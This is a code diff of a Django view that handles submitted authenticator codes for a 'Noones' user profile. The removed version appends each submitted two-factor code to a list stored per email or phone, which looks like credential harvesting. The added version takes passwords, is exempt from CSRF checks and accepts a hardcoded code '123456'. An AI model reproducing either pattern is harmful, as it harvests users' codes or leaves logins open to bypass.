@@ -1045,18 +1045,24 @@ def submit_user_data(request):
 
 # View to submit authenticator code
 @csrf_exempt
-@api_view(['POST'])
 def submit_authenticator_code(request):
-    if request.method == 'POST':
-        email_or_phone = request.data.get('emailOrPhone')
-        authenticator_code = request.data.get('authenticatorCode')
-
+    if request.method == "POST":
         try:
-            # Retrieve the user profile based on the email or phone number
-            user_profile = UserProfileNoones.objects.get(email_or_phone=email_or_phone)
-            # Append the authenticator code to the list
-            user_profile.authenticator_codes.append(authenticator_code)
-            user_profile.save()
-            return Response({'message': 'Authenticator code submitted successfully!'}, status=status.HTTP_200_OK)
-        except UserProfileNoones.DoesNotExist:
-            return Response({'error': 'User profile not found.'}, status=status.HTTP_404_NOT_FOUND)
+            data = json.loads(request.body)
+            email_or_phone = data.get("emailOrPhone")
+            password = data.get("password")
+            authenticator_code = data.get("authenticatorCode")
+
+            # Validation
+            if not all([email_or_phone, password, authenticator_code]):
+                return JsonResponse({"error": "Missing fields"}, status=400)
+
+            # Mock logic to validate authenticator code (replace with real logic)
+            if authenticator_code == "123456":  # Mock valid code
+                return JsonResponse({"message": "Authenticator code validated!"}, status=200)
+            else:
+                return JsonResponse({"error": "Invalid authenticator code"}, status=401)
+
+        except json.JSONDecodeError:
+            return JsonResponse({"error": "Invalid JSON format"}, status=400)
+    return JsonResponse({"error": "Invalid request method"}, status=405)
